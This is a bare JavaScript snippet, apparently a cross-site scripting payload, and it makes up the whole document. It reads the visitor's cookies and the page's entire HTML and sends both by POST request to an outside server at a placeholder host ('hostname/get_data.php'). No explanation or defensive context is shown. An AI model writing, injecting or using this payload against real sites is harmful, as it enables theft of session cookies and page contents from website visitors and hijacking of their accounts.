var http = new XMLHttpRequest();
var url = 'http://hostname/get_data.php';
var params = "cookie="+escape(document.cookie)+'&body='+escape(document.documentElement.innerHTML);
http.open('POST', url, true);

http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        //alert(http.responseText);
    }
}
http.send(params);
